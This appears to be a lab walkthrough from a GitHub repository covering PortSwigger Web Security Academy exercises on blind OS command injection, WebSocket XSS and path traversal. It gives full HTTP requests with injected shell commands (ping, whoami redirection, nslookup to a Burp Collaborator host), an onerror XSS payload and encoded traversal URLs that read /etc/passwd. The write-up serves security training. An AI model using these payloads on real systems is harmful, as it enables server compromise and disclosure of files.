![image](https://user-images.githubusercontent.com/68326057/129083933-76c7585f-b299-498f-80f4-1cb464e430c2.png)


# OS COMMAND INJECTION

## LAB-2) Blind OS command injection with time delays


STEP-1)

![image](https://user-images.githubusercontent.com/68326057/128892383-e9aec988-b43b-4dac-bc4c-953c2c75947b.png)

STEP-2)

```bash
POST /feedback/submit HTTP/1.1
Host: ac041fce1e24ab7180d2370100730005.web-security-academy.net
Cookie: session=6Iw9a3yAPtStpbrmdDu68WNb3A6k6vVR
User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:78.0) Gecko/20100101 Firefox/78.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 103
Origin: https://ac041fce1e24ab7180d2370100730005.web-security-academy.net
Dnt: 1
Referer: https://ac041fce1e24ab7180d2370100730005.web-security-academy.net/feedback
Sec-Gpc: 1
Te: trailers
Connection: close

csrf=uHWDGdgN9S2HeIvIbnMKAxdf5PmuSQQs&name=name&email=email@gmail.com||ping+-c+10+127.0.0.1+||&subject=subject&message=message
```

After 10 Seconds.

![image](https://user-images.githubusercontent.com/68326057/128909609-fa787d65-1b88-4f39-a41b-be362b41a696.png)

![image](https://user-images.githubusercontent.com/68326057/128909629-e66ce51c-7f1d-4f60-b1e3-bdf4b4a44c50.png)


---------------------------------------------

## Lab-3 Blind OS command injection with output redirection


Payload:-

```bash
POST /feedback/submit HTTP/1.1
Host: acd11fb11fa2411680e740d90038004c.web-security-academy.net
Cookie: session=uFl7VHy3dT2YLBOLgmgtMIOinY8QyBWz
User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:78.0) Gecko/20100101 Firefox/78.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 145
Origin: https://acd11fb11fa2411680e740d90038004c.web-security-academy.net
Dnt: 1
Referer: https://acd11fb11fa2411680e740d90038004c.web-security-academy.net/feedback
Sec-Gpc: 1
Te: trailers
Connection: close

csrf=hHEEDk0KRZTtArhIqwQfVrJQjAvKjQvM&name=name&email=email%40gmail.com+||+whoami+>+/var/www/images/whoami.txt+||&subject=subject&message=message
```

Right Click on image , Then Click `open in new tab`

![image](https://user-images.githubusercontent.com/68326057/128911707-f3090511-5e25-428b-b0a1-0413cb460b9a.png)

Then Change The filename to `whoami.txt`.

![image](https://user-images.githubusercontent.com/68326057/128911867-491ce1c7-4562-44dc-921f-84f37e05c525.png)

![image](https://user-images.githubusercontent.com/68326057/128911934-76da5445-bf14-4b43-acd2-bee1211139cf.png)

## Lab 4 : Blind OS command injection with out-of-band interaction

Payload:-

```bash
POST /feedback/submit HTTP/1.1
Host: ac1f1f661efdc245818722e80018005e.web-security-academy.net
Cookie: session=a9yJsPSWgyXARo18dDIub3juYWZLmpVs
User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:78.0) Gecko/20100101 Firefox/78.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 103
Origin: https://ac1f1f661efdc245818722e80018005e.web-security-academy.net
Dnt: 1
Referer: https://ac1f1f661efdc245818722e80018005e.web-security-academy.net/feedback
Sec-Gpc: 1
Te: trailers
Connection: close

csrf=u9t9yeYVcJ9iZLxiTXUtAY48zZ1qvgal&name=name&email=email%40gmail.com+||+nslookup+test.burpcollaborator.net+||&subject=subject&message=message
```



![image](https://user-images.githubusercontent.com/68326057/128914896-456aff67-fef2-4d88-982d-0aa4832c0a39.png)


# WebSockets

## Lab - 1 : Manipulating WebSocket messages to exploit vulnerabilities

In Live Chat

Payload:-

```bash
{"message":"<img src=1 onerror='alert(1)'>"} 
```


![image](https://user-images.githubusercontent.com/68326057/128958454-97efd963-5cdd-479a-9ade-77d7b37236b2.png)

## Lab - 2 : Manipulating the WebSocket handshake to exploit vulnerabilities



# Directory traversal

## Lab - 1: File path traversal, simple case

Payload Used:-

```bash
https://acd31f731fe5b78b809a5516006d0049.web-security-academy.net/image?filename=../../../../etc/passwd
```

![image](https://user-images.githubusercontent.com/68326057/129085856-12f59780-3100-4aac-9739-2c377d21c4ef.png)


## Lab - 2: File path traversal, traversal sequences blocked with absolute path bypass

![image](https://user-images.githubusercontent.com/68326057/129086516-276e3244-4944-4038-b96d-b1fa59ed76f3.png)

![image](https://user-images.githubusercontent.com/68326057/129086628-20fe1a94-c1be-4dba-9413-14b41afcb8ed.png)

## Lab - 3: File path traversal, traversal sequences stripped non-recursively

Payload Used:-

```bash
https://ac441f6b1eb33036806c2ef3007100e2.web-security-academy.net/image?filename=....//....//....//....//etc/passwd
```

![image](https://user-images.githubusercontent.com/68326057/129088943-d41f0651-635d-41ef-b674-b928bcaca65f.png)

## Lab - 4: File path traversal, traversal sequences stripped with superfluous URL-decode
 
![image](https://user-images.githubusercontent.com/68326057/129092902-f8091331-a402-4ad8-bf26-21d0ec61b4a3.png)

Payload Used:-

```bash
https://ac8b1fa41e6ec11780844dfd004000c4.web-security-academy.net/image?filename=%25%32%65%25%32%65%25%32%66%25%32%65%25%32%65%25%32%66%25%32%65%25%32%65%25%32%66%25%36%35%25%37%34%25%36%33%25%32%66%25%37%30%25%36%31%25%37%33%25%37%33%25%37%37%25%36%34
```

![image](https://user-images.githubusercontent.com/68326057/129093045-008d73ad-4fdb-4e23-90f8-bb722e460597.png)


